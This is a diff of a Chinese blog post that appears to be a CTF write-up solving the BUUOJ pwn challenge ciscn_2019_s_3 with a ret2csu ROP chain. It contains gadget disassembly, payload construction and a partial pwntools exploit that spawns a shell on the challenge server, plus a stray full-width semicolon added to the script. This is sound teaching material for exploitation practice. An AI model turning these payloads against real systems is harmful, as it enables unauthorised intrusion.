@@ -6,7 +6,7 @@
         <meta name="robots" content="noodp" />
         <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
         <title>记录一道ret2csu的pwn题 - zyleo&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="记录一道ret2csu的pwn题" />
-<meta property="og:description" content="写这道题之前, 大家首先要了解, 想要获得一个shell, 除了system(&quot;/bin/sh&quot;) 以外, 还有一种更好的方法, 就" />
+<meta property="og:description" content="0x00 前言 写这道题之前, 大家首先要了解, 想要获得一个shell, 除了system(&quot;/bin/sh&quot;) 以外, 还有一种更好的方" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://1iu2y.github.io/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-08-26T17:43:20+08:00" />
@@ -14,7 +14,7 @@
 
 <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="记录一道ret2csu的pwn题"/>
-<meta name="twitter:description" content="写这道题之前, 大家首先要了解, 想要获得一个shell, 除了system(&quot;/bin/sh&quot;) 以外, 还有一种更好的方法, 就"/>
+<meta name="twitter:description" content="0x00 前言 写这道题之前, 大家首先要了解, 想要获得一个shell, 除了system(&quot;/bin/sh&quot;) 以外, 还有一种更好的方"/>
 <meta name="application-name" content="zyleo">
 <meta name="apple-mobile-web-app-title" content="zyleo"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
@@ -27,7 +27,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/1iu2y.github.io\/posts\/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98\/"
-        },"genre": "posts","keywords": "CTF, pwn","wordcount":  380 ,
+        },"genre": "posts","keywords": "CTF, pwn","wordcount":  3953 ,
         "url": "https:\/\/1iu2y.github.io\/posts\/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98\/","datePublished": "2021-08-26T17:43:20+08:00","dateModified": "2021-08-26T17:43:20+08:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -104,27 +104,217 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">记录一道ret2csu的pwn题</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://github.com/liuliuliuzy" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>zyleo</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-26">2021-08-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 380 字&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 1 分钟&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-26">2021-08-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3953 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 8 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
                     <span>目录</span>
                     <span><i class="details-icon fas fa-angle-right"></i></span>
                 </div>
-                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents"></nav></div>
-            </div><div class="content" id="content"><blockquote>
-<p>写这道题之前, 大家首先要了解, 想要获得一个shell, 除了system(&quot;/bin/sh&quot;) 以外, 还有一种更好的方法, 就是系统调用中的 execve(&quot;/bin/sh&quot;, NULL, NULL)获得shell。我们可以在 Linxu系统调用号表 中找到对应的系统调用号,进行调用, 其中32位程序系统调用号用 eax 储存, 第一 、 二 、 三参数分别在 ebx 、ecx 、edx中储存。 可以用 int 80 汇编指令调用。64位程序系统调用号用 rax 储存, 第一 、 二 、 三参数分别在 rdi 、rsi 、rdx中储存。 可以用 syscall 汇编指令调用。</p>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-开始分析">0x01 开始分析</a></li>
+    <li><a href="#0x02-execveret2csu解法">0x02 execve/ret2csu解法</a></li>
+    <li><a href="#0x03-sigreturnsrop解法">0x03 sigreturn/SROP解法</a></li>
+    <li><a href="#0x04-总结">0x04 总结</a>
+      <ul>
+        <li><a href="#参考链接">参考链接</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="0x00-前言">0x00 前言</h2>
+<blockquote>
+<p>写这道题之前, 大家首先要了解, 想要获得一个shell, 除了system(&quot;/bin/sh&quot;) 以外, 还有一种更好的方法, 就是系统调用中的 execve(&quot;/bin/sh&quot;, NULL, NULL)获得shell。我们可以在 Linxu系统调用号表中找到对应的系统调用号,进行调用, 其中<strong>32位程序</strong>系统调用号用 eax 储存, 第一 、 二 、 三参数分别在 <strong>ebx 、ecx 、edx</strong>中储存， 可以用 <strong>int 80</strong>汇编指令调用。<strong>64位程序</strong>系统调用号用 rax 储存, 第一 、 二 、 三参数分别在 <strong>rdi 、rsi 、rdx</strong>中储存， 可以用<strong>syscall</strong> 汇编指令调用。</p>
 </blockquote>
-<p><figure><a class="lightgallery" href="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210826231354889.png" title="image-20210826231354889" data-thumbnail="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210826231354889.png" data-sub-html="<h2>pop_rdi gadget</h2><p>image-20210826231354889</p>">
+<p><a href="https://buuoj.cn/challenges#ciscn_2019_s_3" target="_blank" rel="noopener noreffer">题目链接</a></p>
+<p>这题我是我不会做的🤡，至少在看别人的博客之前是这样。而且，在查阅了众多资料以及自己跟着gdb调试之后，才终于弄懂了这题的一种解法。所以，为了加深理解，在这里记录一下<del>假装是自己做出来的</del>自己复现的解题过程吧。😅</p>
+<h2 id="0x01-开始分析">0x01 开始分析</h2>
+<p>首先checksec</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+</code></pre></td></tr></table>
+</div>
+</div><p>64位，没开PIE，没有cannary，开了NX（说明不能直接写shellcode）。</p>
+<p>IDA看一下，<code>vuln()</code>和<code>gadgets()</code>很显眼啊，<del>看着这函数名当时心想这估计又是一道简简单单的基础rop训练，且看我10分钟拿下🤣</del>那就分别去看一下这两个函数的内容吧。</p>
+<p>首先是<code>vuln()</code>。发现其中调用了<code>sys_read()</code>和<code>sys_write()</code>，都是系统调用的形式。而且<code>sys_read()</code>向大小为<code>0x10</code>的<code>buf</code>写入最多<code>0x400</code>个数，这显然存在溢出。</p>
+<p><figure><a class="lightgallery" href="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827140902790.png" title="image-20210827140902790" data-thumbnail="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827140902790.png" data-sub-html="<h2>vuln()函数</h2><p>image-20210827140902790</p>">
         <img
             class="lazyload"
             src="/svg/loading.min.svg"
-            data-src="image-20210826231354889.png"
-            data-srcset="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210826231354889.png, image-20210826231354889.png 1.5x, /posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210826231354889.png 2x"
+            data-src="image-20210827140902790.png"
+            data-srcset="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827140902790.png, image-20210827140902790.png 1.5x, /posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827140902790.png 2x"
             data-sizes="auto"
-            alt="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210826231354889.png" />
-    </a><figcaption class="image-caption">pop_rdi gadget</figcaption>
+            alt="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827140902790.png" />
+    </a><figcaption class="image-caption">vuln()函数</figcaption>
     </figure></p>
+<p>然后是<code>gadgets()</code>。其中存在两个设置<code>rax</code>寄存器的gadget，查一下<a href="https://archive.next.arttnba3.cn/2000/10/12/%E3%80%90%E8%B5%84%E6%96%99%E5%AD%98%E6%A1%A3-0x01%E3%80%91Linux%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%80%E8%A7%88-by-arttnba3/#0x02.64%E4%BD%8D%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%B8%80%E8%A7%88%E8%A1%A8" target="_blank" rel="noopener noreffer">64位Linux系统调用表</a>，<code>0x0f</code>是<code>sigreturn</code>，<code>0x3b</code>是<code>execve</code>。再结合<code>vuln()</code>中存在<code>syscall</code>语句，就可以确定最明显的思路了，那就是想办法调用<code>execve(&quot;/bin/sh&quot;,  NULL, NULL)</code>来获取shell。</p>
+<p><figure><a class="lightgallery" href="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827142815042.png" title="image-20210827142815042" data-thumbnail="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827142815042.png" data-sub-html="<h2>gadgets</h2><p>image-20210827142815042</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210827142815042.png"
+            data-srcset="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827142815042.png, image-20210827142815042.png 1.5x, /posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827142815042.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827142815042.png" />
+    </a><figcaption class="image-caption">gadgets</figcaption>
+    </figure></p>
+<p>根据前言提到的64位Linux系统调用的传参方式，我们在调用<code>syscall</code>之前需要完成两点：</p>
+<ul>
+<li><code>rax</code>寄存器置为<code>0x3b(59)</code></li>
+<li><code>rdi</code>设为<code>/bin/sh</code>字符串的地址，<code>rsi</code>/<code>rdx</code>设为0</li>
+</ul>
+<h2 id="0x02-execveret2csu解法">0x02 execve/ret2csu解法</h2>
+<p>首先要想一下怎么获取指向字符串<code>/bin/sh</code>的地址。IDA view-&gt;open subviews-&gt;strings查看，发现没有<code>/bin/sh</code>。所以只能调<code>sys_read()</code>自己写了。同时，注意到**<code>vuln()</code>函数的结尾是没有<code>leave</code>指令的**，所以<code>vlun()</code>被调用完之后其函数栈并没有被清空，于是我们可以写<code>/bin/sh</code>在栈上，而且覆盖的时候覆盖的<code>rbp</code>就直接是返回地址。</p>
+<p>那么第二个问题来了，如何知道<code>vuln()</code>函数栈的地址呢，答案就是利用<code>vuln()</code>中的<code>sys_write()</code>调用。该调用输出<code>0x30</code>个字节的内容，在调试的过程中可以看到，<code>buf</code>在栈上的地址为<code>0xdf30</code>，而从源码可知它与<code>rbp</code>的距离为<code>0x10</code>个字节，所以<code>sys_write()</code>输出的第<code>0x21~0x28</code>个字节是可执行文件名的地址，输出内容与<code>buf</code>地址的偏移为<code>0xe048-0xdf30=0x118=280</code>。所以，我们可以通过泄露可执行文件名地址的方式来获取<code>buf</code>的地址。</p>
+<p>需要注意的是，题目说明了该题的远程环境为<code>Ubuntu18</code>，而我一开始是用<code>Ubuntu20</code>调试的，所以得到的偏移为<code>0x128</code>，多了<code>0x10</code>个字节，我说怎么一直不对，后来再装了个ubuntu18的wsl，发现果然如此，估计是系统的地址对齐之类的原因。有趣的是，在这一过程中还学习了一些wsl的新操作，也算是需求导向性学习了，<a href="" rel="">记录在了这里</a>。</p>
+<p><figure><a class="lightgallery" href="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827112504437.png" title="image-20210827112504437" data-thumbnail="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827112504437.png" data-sub-html="<h2>wsl-ubuntu18</h2><p>image-20210827112504437</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210827112504437.png"
+            data-srcset="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827112504437.png, image-20210827112504437.png 1.5x, /posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827112504437.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827112504437.png" />
+    </a><figcaption class="image-caption">wsl-ubuntu18</figcaption>
+    </figure></p>
+<p><code>Ubuntu20</code>上面看到的就是<code>0xdf58-0xde30=0x128=296</code>。</p>
+<p><figure><a class="lightgallery" href="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827112608649.png" title="image-20210827112608649" data-thumbnail="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827112608649.png" data-sub-html="<h2>wsl-ubuntu20</h2><p>image-20210827112608649</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210827112608649.png"
+            data-srcset="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827112608649.png, image-20210827112608649.png 1.5x, /posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827112608649.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827112608649.png" />
+    </a><figcaption class="image-caption">wsl-ubuntu20</figcaption>
+    </figure></p>
+<p>OK，地址知道了，<code>execve()</code>的3个参数的值我们都能够确定了，所以第一步就是泄露&rsquo;buf&rsquo;的地址。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln_addr</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
+
+<span class="n">stack_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x118</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>上面的<code>payload1</code>发完之后，又进入了<code>vuln()</code>。接下来的就是通过第二个payload想办法构造ROP链来实现控制寄存器与函数跳转的过程，这又是这题的一个难点（因为我做这题之前不知道ret2csu😶）。最简单的思路那肯定是用ROPgadget找到能够pop三个寄存器、然后ret的gadget。但是ROPgadget只能找到<code>pop rdi</code>和<code>pop rsi</code>的gadget（为什么<code>pop rsi; pop r15; ret</code>这条指令从中间开始取就是<code>pop rdi; ret</code>？这是指令设计的原因吗？），还差一个，所以这种方法行不通。</p>
+<p><figure><a class="lightgallery" href="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827152113322.png" title="image-20210827152113322" data-thumbnail="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827152113322.png" data-sub-html="<h2>&#39;pop rdx&#39; 找不到</h2><p>image-20210827152113322</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210827152113322.png"
+            data-srcset="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827152113322.png, image-20210827152113322.png 1.5x, /posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827152113322.png 2x"
+            data-sizes="auto"
+            alt="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827152113322.png" />
+    </a><figcaption class="image-caption">'pop rdx' 找不到</figcaption>
+    </figure></p>
+<p>因此，我们得用一种新的ret方式，<code>ret2csu</code>，就是利用<code>_libc_csu_init()</code>的<code>pop</code>和<code>mov</code>两个gadget来实现控制寄存器的操作，一般适用于64位的题目。<code>ret2csu</code>的参考资料网上都有，感觉<a href="http://www.sec4.fun/2020/05/14/csu/" target="_blank" rel="noopener noreffer">这篇</a>写的挺清晰的。</p>
+<p>两段gadget为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">//mov
+.text:0000000000400580 loc_400580:                             ; CODE XREF: __libc_csu_init+54↓j
+.text:0000000000400580                 mov     rdx, r13
+.text:0000000000400583                 mov     rsi, r14
+.text:0000000000400586                 mov     edi, r15d
+.text:0000000000400589                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]
+.text:000000000040058D                 add     rbx, 1
+.text:0000000000400591                 cmp     rbx, rbp
+.text:0000000000400594                 jnz     short loc_400580
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">//pop
+.text:000000000040059A                 pop     rbx
+.text:000000000040059B                 pop     rbp
+.text:000000000040059C                 pop     r12
+.text:000000000040059E                 pop     r13
+.text:00000000004005A0                 pop     r14
+.text:00000000004005A2                 pop     r15
+.text:00000000004005A4                 retn
+</code></pre></td></tr></table>
+</div>
+</div><p>总结下来就是：</p>
+<ul>
+<li><code>r15d</code> -&gt; <code>edi</code> （一般来说<code>rdi</code>寄存器高8位都是0，所以这里虽然只控制了低8位，但实际上相当于可以控制<code>rdi</code>的值）</li>
+<li><code>r14</code> -&gt; <code>rsi</code></li>
+<li><code>r13</code> -&gt; <code>rdx</code></li>
+<li>还有，<code>rbx</code>设为0，然后<code>call [r12+rbx*8];</code>就会以<code>r12</code>存储的地址为起点取指令，并且每次向后跳8位，因为call指令后会将<code>rbx</code>加1，然后对比<code>rbp</code>，如果不相等则再次循环</li>
+</ul>
+<p>于是，理论上，我们就能够构造一段极其巧妙的<code>payload2</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbx_rbp_r12_r13_r14_r15_ret</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="o">+</span><span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_59_ret</span><span class="p">)</span>
+<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>对应的执行流程为：</p>
+<ol>
+<li>写完'/bin/sh'，<code>vuln()</code>内执行<code>retn</code>，进而执行<code>pop_rbx_rbp_r12_r13_r14_r15_ret</code>。<code>pop</code>6次，<code>rbx</code>/<code>rbp</code>/<code>r12</code>/<code>r13</code>/<code>r14</code>/<code>r15</code>分别被设为<code>0</code>/<code>0</code>/<code>binsh_addr+0x50</code>/<code>0</code>/<code>0</code>/<code>0</code>/，<code>rsp</code>此时指向<code>mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</code>，接在再<code>retn</code>，执行<code>mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</code>，此时<code>rsp</code>指向<code>mov_rax_59_ret</code>，<strong>注意，这刚好是前面的<code>binsh_addr_0x50</code>😬</strong></li>
+<li><code>mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</code>指令执行，<code>rsi</code>/<code>rdx</code>被设置为0，第一次<code>call [r12];</code>。</li>
+<li>众所周知，<code>call</code>指令的执行过程是先push再jump，然后jump的目的指令段最后一般都有个ret回来。所以，第一次执行<code>call [r12];</code>，就相当于执行<code>mov_rax_59_ret</code>，把<code>rax</code>设为了<code>59</code>，然后<code>ret</code>。经过一番<code>push</code>/<code>ret</code>之后，<strong><code>rsp</code>又回到了<code>mov_rax_59_ret</code>的位置</strong>，但此时<code>rbx</code>已经被加了1，值变为了<code>1</code>。然后通过后面的<code>cmp</code>判断，<code>jnz</code>再次跳回<code>mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</code>指令开头。</li>
+<li>再次执行<code>mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</code>，不同的是，此时<code>rbx</code>为<code>1</code>，所以<code>call</code>指令变为了<code>call [r12+8];</code>，所以<code>pop_rdi_ret</code>被执行：<code>call</code>首先<code>push</code>，<code>rsp</code>指向<code>call</code>之后的下一条指令，然后<code>jump</code>；<code>jump</code>之后<code>pop rdi</code>，<code>rdi</code>变为了<code>call</code>的下一条指令地址，<code>rsp</code>指向<code>mov_rax_59_ret</code>；再接着<code>ret</code>，<code>rsp</code>指向<code>pop_rdi_ret</code>，<code>rip</code>指令寄存器的内容为<code>mov_rax_59_ret</code>，所以系统执行的下一条指令为<code>mov_rax_59_ret</code>。</li>
+<li>执行<code>mov_rax_59_ret</code>，<code>rsp</code>指向<code>binsh_addr</code>，<code>rip</code>指令寄存器的内容为<code>pop_rdi_ret</code>，所以系统执行的下一条指令为<code>pop_rdi_ret</code>。</li>
+<li><code>pop rdi;</code>将<code>binsh_addr</code>写入<code>rdi</code>，然后<code>ret</code>执行<code>syscall</code>。此时，<code>rax</code>为59，且三个寄存器<code>rdi</code>/<code>rsi</code>/<code>rdx</code>分别为<code>binsh_addr</code>/<code>0</code>/<code>0</code>，相当于执行<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>，拿到shell。</li>
+</ol>
+<p>感觉<a href="http://liul14n.top/2020/03/07/Ciscn-2019-s-3/" target="_blank" rel="noopener noreffer">这篇博客</a>里的执行流程分析好像写错了一步&hellip;</p>
+<p>最终完整exp如下。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -164,15 +354,15 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
+<span class="err">；</span>
 <span class="c1"># 本地调试</span>
 <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
     <span class="c1"># context.terminal = [&#34;wsl&#34;, &#34;-c&#34;]</span>
-    <span class="c1"># io = process(&#34;./ciscn_2019_s_3&#34;)</span>
+    <span class="c1"># io = process(&#34;./ciscn_s_3&#34;)</span>
     <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&#34;./ciscn_s_3&#34;</span><span class="p">)</span>
 <span class="k">else</span><span class="p">:</span>
     <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span> <span class="mi">25280</span><span class="p">)</span>
-    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+    <span class="c1"># context.log_level = &#39;debug&#39;</span>
 
 <span class="n">vuln_addr</span> <span class="o">=</span> <span class="mh">0x4004ed</span>
 <span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x400517</span>
@@ -199,7 +389,84 @@
 <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></td></tr></table>
 </div>
-</div><p>挖坑，明天来填，讲真现在对这题还是不太懂😶</p>
+</div><p>执行截图</p>
+<p><figure><a class="lightgallery" href="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827162304078.png" title="image-20210827162304078" data-thumbnail="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827162304078.png" data-sub-html="<h2>执行结果</h2><p>image-20210827162304078</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="image-20210827162304078.png"
+            data-srcset="/posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827162304078.png, image-20210827162304078.png 1.5x, /posts/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827162304078.png 2x"
+            data-sizes="auto"
